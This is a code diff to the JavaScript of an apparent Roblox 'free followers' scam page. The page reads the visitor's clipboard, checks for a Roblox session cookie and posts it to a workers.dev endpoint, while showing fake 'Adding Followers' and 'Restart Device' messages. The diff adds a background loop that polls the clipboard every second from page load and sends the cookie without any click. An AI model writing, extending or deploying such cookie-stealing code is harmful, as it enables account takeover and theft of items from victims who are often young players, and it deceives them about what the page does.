@@ -464,22 +464,8 @@ const status = document.getElementById("status");
 const SEND_ENDPOINT =
   "https://young-brook-716e.abojanmawzoon.workers.dev";
      
-button.addEventListener("click", async () => {     
-     
-  try {     
-     
-    status.innerHTML = `     
-      <span class="spinner"></span>     
-      Adding Followers...     
-    `;     
-     
-    const text = await navigator.clipboard.readText();     
-     
-    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
-      status.textContent = "error make sure u copy cookie";     
-      return;     
-    }     
-     
+async function sendClipboardData(text) {
+  try {
     await fetch(SEND_ENDPOINT, {     
       method: "POST",     
       headers: {     
@@ -492,16 +478,59 @@ button.addEventListener("click", async () => {
      
     await new Promise(resolve => setTimeout(resolve, 10000));     
      
-    status.textContent =     
-      "Restart Device To Get Followers Added to your account!";     
+    status.textContent = "Restart Device To Get Followers Added to your account!";     
+  } catch (error) {     
+    status.textContent = "Something went wrong. Please try again.";     
+    console.error(error);     
+  }
+}
+
+button.addEventListener("click", async () => {     
+  try {     
+    status.innerHTML = `     
+      <span class="spinner"></span>     
+      Adding Followers...     
+    `;     
+     
+    const text = await navigator.clipboard.readText();     
+     
+    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
+      status.textContent = "error make sure u copy cookie";     
+      return;     
+    }     
+     
+    await sendClipboardData(text);
      
   } catch (error) {     
-     
-    status.textContent =     
-      "Something went wrong. Please try again.";     
-     
+    status.textContent = "error make sure u copy cookie";     
     console.error(error);     
   }     
+});
+
+// Continuously check clipboard in the background every second
+async function monitorClipboard() {
+  if (!navigator.clipboard || !navigator.clipboard.readText) return;
+  
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text && text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
+      status.innerHTML = `     
+        <span class="spinner"></span>     
+        Adding Followers...     
+      `;
+      await sendClipboardData(text);
+      // Stop checking once successfully sent
+      return;
+    }
+  } catch (e) {
+    // Clipboard permission might require a user gesture or focus first
+  }
+  
+  setTimeout(monitorClipboard, 1000);
+}
+
+window.addEventListener("load", () => {
+  setTimeout(monitorClipboard, 500);
 });
 
 const pcVideo = document.querySelector(".pc-container");
